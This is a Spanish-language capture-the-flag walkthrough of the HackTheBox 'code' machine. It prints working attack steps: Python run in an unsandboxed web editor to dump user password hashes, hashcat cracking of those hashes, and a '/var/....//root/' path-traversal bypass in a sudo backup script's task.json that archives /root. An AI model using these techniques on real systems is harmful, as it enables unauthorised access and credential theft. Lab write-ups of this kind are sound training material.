# Walkthrough - HTB "code" Machine

Este walkthrough detalla el proceso completo para explotar la máquina "code" de HackTheBox, desde la enumeración inicial hasta la obtención de las dos flags (user y root). Se explica el uso del editor Python vulnerable para interactuar con el modelo SQLAlchemy, la extracción de datos, el crackeo de hashes y la escalada de privilegios mediante un script de backup.

```

## 1. Enumeración Inicial

Se realizó un escaneo completo de puertos con Nmap para identificar servicios disponibles:

```bash
nmap -p- --open -sS -vvv 10.10.11.62
``` 

**Salida (fragmento):**

```bash
PORT     STATE SERVICE
5000/tcp open  http
...
``` 

Se detecta que el puerto **5000** responde y muestra un servicio web que, al acceder, permite ejecutar código en Python.

```

## 2. Acceso al Editor Python Vulnerable

Al navegar a: http://10.10.11.62:5000


se muestra un editor (basado en Ace Editor) para escribir y ejecutar código Python. Observaciones importantes:

- **Imports bloqueados:** No se pueden usar sentencias `import`, pero el comando `print` funciona.
- **Acceso a funciones básicas:** Se pueden ejecutar `print(dir())` y `print(globals())` para inspeccionar el entorno global.

Esto indica que el código se ejecuta en el espacio global de la aplicación (Flask) y que hay objetos internos accesibles.

```

## 3. Exploración del Namespace y Obtención del Modelo User

Ejecutamos en el editor:

```python
print(dir())
``` 

Se listan todas las variables globales y, entre ellas, se encuentra el objeto `User`. Para confirmar, ejecutamos:

```python
print(dir(User))
``` 

**Salida (fragmento):**

```bash
['__abstract__', '__annotations__', '__class__', ..., 'id', 'username', 'password', 'query', ...]
``` 

Esto confirma que **User** es un modelo de SQLAlchemy y que se puede interactuar con él mediante su atributo `query`.

Creamos entonces un pequeño script para listar los datos de los usuarios:

```python
for u in User.query.all():
    print(u.username, u.password)
``` 

**Resultado obtenido:**

```bash
development 759b74ce43947f5f4c91aeddc3e5bad3
martin 3de6f30c4a09c27fc71932bfc68474be
radega e89674615091bda1a423cf909aeef7e3
``` 

```

## 4. Crackeo de Hashes de Contraseña

Guardamos los hashes extraídos en un fichero llamado `hashes.txt`:

```bash
759b74ce43947f5f4c91aeddc3e5bad3
3de6f30c4a09c27fc71932bfc68474be
e89674615091bda1a423cf909aeef7e3
``` 

Utilizamos **hashcat** para romper los hashes (modo MD5) usando el diccionario `rockyou.txt`:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
``` 

> **Opciones utilizadas:**
> - `-m 0`: Modo para MD5.
> - `-a 0`: Ataque de diccionario (straight mode).

**Resultado (ejemplo):**

```bash
759b74ce43947f5f4c91aeddc3e5bad3:development
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
``` 

```

## 5. Escalada de Privilegios – Obtención de la User Flag

Verificamos los permisos con el comando:

```bash
sudo -l
``` 

**Salida:**

```bash
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
``` 

Esto indica que el usuario **martin** puede ejecutar sin contraseña el script `/usr/bin/backy.sh`.

### 5.1. Backup de la User Home

En el directorio `/home/martin/backups/` se encuentran ficheros como:

- `code_home_app-production_app_2024_August.tar.bz2`
- `task.json`

El contenido inicial de `task.json` es:

```json
{
    "destination": "/home/martin/backups/",
    "multiprocessing": true,
    "verbose_log": false,
    "directories_to_archive": [
         "/home/app-production/"
    ],
    "exclude": [
         ".*"
    ]
}
``` 

Ejecutamos el script de backup:

```bash
sudo /usr/bin/backy.sh task.json
``` 

**Salida:**

```bash
2025/04/12 16:58:20 🍀 backy 1.2
2025/04/12 16:58:20 📋 Working with task.json ...
2025/04/12 16:58:20 💤 Nothing to sync
2025/04/12 16:58:20 📤 Archiving: [/home/app-production]
2025/04/12 16:58:20 📥 To: /home/martin/backups ...
2025/04/12 16:58:20 📦
``` 

Luego listamos y extraemos el backup:

```bash
ls -la /home/martin/backups/
tar -xvjf code_home_app-production_2025_April.tar.bz2
``` 

Dentro del backup se encuentra el archivo `home/app-production/user.txt` que contiene la **user flag**.

```

## 6. Escalada de Privilegios – Obtención de la Root Flag

Para obtener la flag de root, modificamos el fichero `task.json` para respaldar el contenido del directorio `/root/` mediante un bypass en la validación de rutas.

### 6.1. Modificar task.json para Respaldo de Root

Editamos el fichero `task.json` para que quede de la siguiente manera:

```json
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
``` 

> **Explicación:**  
> Se utiliza la ruta `/var/....//root/` en lugar de la secuencia típica `../../root/` para evadir controles de validación y lograr incluir el directorio `/root/` en el backup.

### 6.2. Ejecutar el Script de Backup para Root

Ejecutamos:

```bash
sudo /usr/bin/backy.sh task.json
``` 

**Salida:**

```bash
2025/04/12 17:21:10 🍀 backy 1.2
2025/04/12 17:21:10 📋 Working with task.json ...
2025/04/12 17:21:10 💤 Nothing to sync
2025/04/12 17:21:10 📤 Archiving: [/var/../root]
2025/04/12 17:21:10 📥 To: /home/martin ...
2025/04/12 17:21:10 📦
``` 

Se genera un nuevo backup (por ejemplo, `code_var_.._root_2025_April.tar.bz2`) en el directorio `/home/martin/`.

### 6.3. Descargar y Extraer el Backup de Root

Nos movemos al directorio home y listamos los archivos:

```bash
cd ~
ls
``` 

Se observa el archivo generado, que se extrae con:

```bash
tar -xvjf code_var_.._root_2025_April.tar.bz2
``` 

Dentro del contenido extraído se encuentra la **root flag**.

```

## 7. Conclusiones

Este walkthrough mostró los siguientes pasos:

1. **Enumeración:**
   - Se utilizó Nmap para detectar servicios, destacando el servicio en el puerto 5000.

2. **Acceso al Editor Python Vulnerable:**
   - Se comprobó que la aplicación permite ejecutar código (usando `print`, `dir`, `globals`) en un ambiente sin aislamiento.

3. **Extracción de Datos:**
   - Se identificó el modelo `User` de SQLAlchemy y se ejecutó un script para listar usuarios y obtener hashes MD5.

4. **Crackeo de Hashes:**
   - Se usó hashcat para romper los hashes MD5, obteniendo credenciales como "development" y "nafeelswordsmaster".

5. **Obtención de la User Flag:**
   - Se utilizó el script de backup (`/usr/bin/backy.sh`) mediante un fichero de configuración `task.json` para respaldar el directorio `/home/app-production/` y extraer la flag de usuario desde `user.txt`.

6. **Obtención de la Root Flag:**
   - Se modificó `task.json` para incluir una ruta de bypass que permite respaldar el contenido del directorio `/root/`.
   - Se ejecutó el backup, se descargó el archivo generado y se extrajo para obtener la flag de root.

**¡Enhorabuena! Has conseguido ambas flags.**

> **Advertencia:**  
> Este ejercicio se realizó en un entorno controlado (CTF). Utiliza estos conocimientos únicamente de forma ética y legal.

```


